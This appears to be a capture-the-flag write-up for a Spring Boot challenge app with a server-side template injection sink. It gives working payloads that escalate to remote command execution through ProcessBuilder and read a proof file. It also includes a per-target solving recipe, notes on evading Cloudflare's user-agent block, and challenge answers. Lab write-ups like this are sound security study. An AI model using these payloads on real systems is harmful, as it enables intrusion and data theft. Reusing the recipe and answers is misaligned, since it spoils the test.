Target

A Spring Boot app, "Message Mill" (nav: "Spring Boot · analyst workspace"). Web challenges expose no downloadable artifact — each started attempt returns live target site(s) in targets[].

Recon — find the sink

  1. GET / → links to /api/clues ("Open workspace notes").
  2. GET /api/clues → JSON: json {"framework":"Spring Boot","feature_route":"/process-fbda5a","current_role":"analyst"} The feature_route is per-target (random hex suffix). It is served without a trailing slash (/process-<hex> → 200; /process-<hex>/ → 404 {"error":"not_found"}).
  3. GET /process-<hex> renders <article><h1>Rendered message</h1><pre></pre></article>.
  4. Parameter discovery — only ?template= reflects into the <pre>: GET /process-<hex>?template=ZZmarkerQQ → <pre>ZZmarkerQQ</pre>.

Fingerprint — the expression engine

The template value is evaluated as an expression, not echoed literally. Mustache-style {{ … }} delimiters, Java object model:

Payload (?template=) <pre> output Meaning
{{7*7}} 49 arithmetic evaluated
${7*7}, #{7*7}, [[${7*7}]] unchanged not SpEL / not Thymeleaf-inline
{{2^8}} 256 ^ is exponentiation (MVEL-style, not XOR)
{{ ''.class }} class java.lang.String Java class access
{{ ''.getClass().getName() }} java.lang.String method invocation on objects
{{ 'abc'.toUpperCase() }} ABC arbitrary Java method calls
{{ ''.__class__ }}, {{ range(3) }} error not Python Jinja2

→ A Java {{ }} expression evaluator (MVEL/OGNL-family) that permits object navigation, static access via getClass().forName(...), and the new operator. Despite the "Spring Boot" branding the sink is not SpEL ${}; it is a {{ }} evaluator with full reflective reach — i.e. effectively unrestricted.

Escalation — reflection → RCE

new and java.io.File work directly:

{{ new java.io.File('.').getAbsolutePath() }}            -> /app/.
{{ ''.getClass().forName('java.lang.System').getenv() }} -> {HOME=/home/arena, PATH=..., JAVA_HOME=..., ...}

Environment and System.getProperties() carry no proof (app runs from /app/app.jar, user arena, Java 21 / Eclipse Adoptium). Full command execution via ProcessBuilder (no static-method resolution needed), output read with a Scanner using the \A whole-stream delimiter:

{{ new java.util.Scanner(
     new java.lang.ProcessBuilder('sh','-c','id').start().getInputStream()
   ).useDelimiter('\A').next() }}

→ uid=10001(arena) gid=10001(arena) groups=10001(arena) — verified RCE.

Proof recovery

The per-target secret is not web-served, not in env, and not baked into the (static, shared) app.jar — it is a per-target file. Read it with the same RCE at the canonical Huntress-2026 location (see challenges/_lib/autosolve_web.py PROOF_PATHS):

sh -c 'cat /run/huntress/proof.txt'      # -> proof_<hex32>
# fallbacks seen across the web lane: /run/huntress/flag.txt, /flag, /flag.txt, /proof.txt

Submit the recovered proof_<hex32> verbatim as the exact_text answer for that target. For Mastery, each of the three live targets (proof-1/proof-2/proof-3 ↔ Target 1/2/3) yields its own proof; all three are batched into one submit.

Deterministic recipe (per target)

  1. GET /api/clues → feature_route (strip any trailing slash).
  2. GET <feature_route>?template={{7*7}} → expect 49 (confirm the {{ }} sink).
  3. GET <feature_route>?template={{ <ProcessBuilder+Scanner reading /run/huntress/proof.txt> }}.
  4. Regex proof_[0-9a-f]{32} from the <pre> body → submit as exact_text (trim).

All GETs use a real Chrome User-Agent (Cloudflare fronts every target and returns error code: 1010 for urllib's default UA).
